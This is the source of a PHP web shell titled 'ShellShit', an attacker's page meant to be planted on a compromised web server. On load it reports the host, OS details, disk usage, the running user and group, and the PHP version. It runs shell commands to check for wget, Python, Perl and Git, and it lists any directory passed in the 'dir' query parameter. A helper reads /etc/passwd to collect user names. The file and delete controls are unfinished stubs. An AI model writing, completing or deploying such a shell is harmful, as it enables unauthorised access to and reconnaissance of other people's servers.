<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <title>ShellShit</title>
</head>
<body class="bg-dark">
<?php


// FUNCTIONS =================================================

function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function hddsize($size) {
	if($size >= 1073741824)
		return sprintf('%1.2f',$size / 1073741824 ).' GB';
	elseif($size >= 1048576)
		return sprintf('%1.2f',$size / 1048576 ) .' MB';
	elseif($size >= 1024)
		return sprintf('%1.2f',$size / 1024 ) .' KB';
	else
		return $size .' B';
}

function hdd() {
	$hdd['size'] = hddsize(disk_total_space("/"));
	$hdd['free'] = hddsize(disk_free_space("/"));
	$hdd['used'] = hddsize(disk_total_space("/") - disk_free_space("/"));
	return (object) $hdd;
}


function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}

// END FUNCTIONS ==================================================
$serverhost =  $_SERVER['HTTP_HOST'];



?>
	<div class="container">
		<table>
			<tr>
				<td><img src="https://1.bp.blogspot.com/-FWB7KaG6jV4/X_0cXca7uKI/AAAAAAAADOk/NtNe4wjiUBwsOc3nKQiOweXVxHaaKNI4gCLcBGAsYHQ/s320/shithe.png" style="width: 70px"></td>
				<td><h1 class="mt-5 mb-5 text-danger font-weight-bold">< ShellShit /></h1></td>
			</tr>
		</table>
		
		<table class="table table-sm table-borderless">
			<tr>
				<td class="text-light font-weight-bold">Server Name</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo $serverhost; ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">System</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo php_uname(); ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">HardDrive</td>
				<td class="text-light">:</td>
				<td class="text-primary">
					<table>
						<tr>
							<td><b>USED</b></td>
							<td><?php echo hdd()->used; ?></td>
							<td><b>SIZE</b></td>
							<td><?php echo hdd()->size; ?></td>
							<td><b>FREE</b></td>
							<td><?php echo hdd()->free; ?></td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">User/Group</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo usergroup()->name." (". usergroup()->uid .") / ".usergroup()->group." (". usergroup()->uid . ")"; ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">Web Server</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo str_replace('/', ' ', explode(' ', $_SERVER['SERVER_SOFTWARE'])[0]) ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">PHP Version</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo phpversion(); ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">Installed Library</td>
				<td class="text-light">:</td>
				<td class="text-primary">
					<table >
						<tr>
							<td>
								<?php 
									if (function_exists('mysql_connect')) {
										echo "<li class='text-success'>MYSQL</li>";
									}else{
										if(function_exists('mysqli_connect')){
											echo "<li class='text-success'>MYSQL</li>";
										}else{
											echo "<li class='text-danger'>MYSQL</li>";
										}
									}
								 ?>
							</td>
							<td>
								<?php 
									if (function_exists('curl_init')) {
										echo "<li class='text-success'>cURL</li>";
									}else{
										echo "<li class='text-danger'>cURL</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (exec('python -V')) {
										echo "<li class='text-success'>Python</li>";
									}else{
										echo "<li class='text-danger'>Python</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (exec('wget --help')) {
										echo "<li class='text-success'>Wget</li>";
									}else{
										echo "<li class='text-danger'>Wget</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (shell_exec('perl --help')) {
										echo "<li class='text-success'>Perl</li>";
									}else{
										echo "<li class='text-danger'>Perl</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (shell_exec('git --help')) {
										echo "<li class='text-success'>Git</li>";
									}else{
										echo "<li class='text-danger'>Git</li>";
									}
								 ?>
							</td>
						</tr>
					</table>
					
				</td>
			</tr>
		</table>
		

		<table class="table table-sm table-bordered">
			<tr class="text-light bg-danger font-weight-bold">
				<td>Name</td>
				<td>Type</td>
				<td>Size</td>
				<td>Last Modified</td>
				<td>Owner/Group</td>
				<td>Permission</td>
				<td>Option</td>
			</tr>
			<?php 
			$directory = scandir(path());
				foreach($directory as $data){
					?>
						<tr class="text-light">
							<td><?php echo $data; ?></td>
							<td></td>
							<td></td>
							<td></td>
							<td></td>
							<td></td>
							<td>
								<button class="btn btn-danger btn-sm">Delete</button>
								<button class="btn btn-primary btn-sm">Rename</button>
							</td>
						</tr>
					<?php
				}

			?>
		</table>
		


	</div>
</body>
</html>